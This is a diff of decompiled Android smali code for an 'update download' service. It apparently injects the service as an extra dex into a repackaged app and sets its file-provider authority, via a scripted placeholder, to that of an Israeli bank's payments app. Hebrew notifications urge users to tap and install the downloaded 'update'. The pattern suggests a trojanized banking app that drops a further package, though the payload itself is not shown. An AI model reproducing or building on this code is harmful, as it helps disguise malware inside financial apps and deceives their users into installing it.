@@ -1,4 +1,4 @@
-# classes.dex
+# classes4.dex
 
 .class Lstoreautoupdater/DownloadService$1;
 .super Ljava/lang/Object;
@@ -74,7 +74,7 @@
 
     move-result-object v4
 
-    const-string v5, "Downloading Update"
+    const-string v5, "הורדת עדכון"
 
     invoke-virtual {v4, v5}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
 
@@ -236,8 +236,7 @@
 
     iget-object v6, v1, Lstoreautoupdater/DownloadService$1;->this$0:Lstoreautoupdater/DownloadService;
 
-    # --- פלייסחולדר יוחלף אוטומטית ע"י פייתון ---
-    const-string v8, "__PROVIDER_AUTHORITY__"
+    const-string v8, "com.bnhp.payments.paymentsapp.provider"
 
     new-instance v2, Ljava/io/File;
 
@@ -297,7 +296,7 @@
 
     move-result-object v5
 
-    const v6, 0x1080082  # זהו הקוד של stat_sys_download_done
+    const v6, 0x1080082
 
     invoke-virtual {v4, v6}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
 
@@ -305,11 +304,11 @@
 
     invoke-virtual {v4, v6, v6, v6}, Landroid/app/Notification$Builder;->setProgress(IIZ)Landroid/app/Notification$Builder;
 
-    const-string v6, "Download Complete"
+    const-string v6, "ההורדה הושלמה"
 
     invoke-virtual {v4, v6}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
 
-    const-string v6, "Tap to install the update"
+    const-string v6, "לחץ כאן להתקנת העדכון"
 
     invoke-virtual {v4, v6}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
 
@@ -320,19 +319,19 @@
     move-result-object v5
 
     invoke-virtual {v3, v0, v5}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V
-    :try_end_115
-    .catch Ljava/lang/Exception; {:try_start_3b .. :try_end_115} :catch_116
+    :try_end_11b
+    .catch Ljava/lang/Exception; {:try_start_3b .. :try_end_11b} :catch_11c
 
-    goto :goto_12e
+    goto :goto_134
 
-    :catch_116
+    :catch_11c
     move-exception v5
 
     const/4 v6, 0x0
 
     invoke-virtual {v4, v6, v6, v6}, Landroid/app/Notification$Builder;->setProgress(IIZ)Landroid/app/Notification$Builder;
 
-    const-string v7, "Download Failed"
+    const-string v7, "ההורדה נכשלה"
 
     invoke-virtual {v4, v7}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
 
@@ -348,7 +347,7 @@
 
     invoke-virtual {v3, v0, v5}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V
 
-    :goto_12e
+    :goto_134
     move-object/from16 v1, p0
 
     iget-object v0, v1, Lstoreautoupdater/DownloadService$1;->this$0:Lstoreautoupdater/DownloadService;
